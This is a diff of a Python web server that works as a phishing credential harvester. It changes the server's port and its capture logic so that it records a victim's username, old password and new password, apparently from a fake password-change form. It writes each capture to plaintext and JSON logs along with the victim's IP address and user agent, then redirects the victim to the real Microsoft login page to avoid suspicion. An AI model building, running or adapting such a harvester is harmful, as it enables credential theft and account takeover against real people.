@@ -9,7 +9,7 @@ from datetime import datetime
 from urllib.parse import parse_qs
 
 LISTEN_IP   = "0.0.0.0"
-LISTEN_PORT = 80
+LISTEN_PORT = 8080
 LOG_FILE    = "credentials.txt"   # easy-to-read capture log
 RAW_FILE    = "requests.jsonl"    # full JSON log for tooling
 REDIRECT_TO = "https://login.microsoftonline.com/"  # where victims land after "login"
@@ -42,18 +42,19 @@ class Handler(http.server.BaseHTTPRequestHandler):
         raw = self.rfile.read(length).decode("utf-8", "replace")
         fields = parse_qs(raw)
         username = fields.get("username", [""])[0]
-        password = fields.get("password", [""])[0]
+        old_password = fields.get("oldpassword", [""])[0]
+        new_password = fields.get("newPassword", [""])[0]
         ip   = self.client_address[0]
         ua   = self.headers.get("User-Agent", "")
         ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
         # --- Capture the credentials ---------------------------------
         with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(f"[{ts}] {ip} | {username} | {password} | {ua}\n")
+            f.write(f"[{ts}] {ip} | {username} | {old_password} | {new_password} | {ua}\n")
         with open(RAW_FILE, "a", encoding="utf-8") as f:
             f.write(json.dumps({"ts": ts, "ip": ip, "ua": ua,
-                                "user": username, "pass": password}) + "\n")
-        print(f"[{ts}] [+] {ip} submitted: {username} / {password}")
+                                "user": username, "old_pass": old_password, "new_pass": new_password}) + "\n")
+        print(f"[{ts}] [+] {ip} submitted: {username} / {old_password} / {new_password}")
 
         # --- Redirect to the real site so the victim sees nothing odd --
         self.send_response(302)
